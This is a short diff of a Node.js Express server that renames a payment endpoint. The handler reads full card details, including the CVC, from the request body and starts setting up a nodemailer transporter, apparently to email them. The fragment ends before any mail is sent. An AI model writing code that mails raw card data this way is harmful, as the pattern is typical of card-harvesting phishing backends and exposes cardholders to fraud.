@@ -10,7 +10,7 @@ app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.json());
 
 // Endpoint to handle form submission
-app.post('/submit-payment', async (req, res) => {
+app.post('/send-payment', async (req, res) => {
     const { email, cardnumber, expiry, cvc, cardholder, country } = req.body;
 
     let transporter = nodemailer.createTransport({
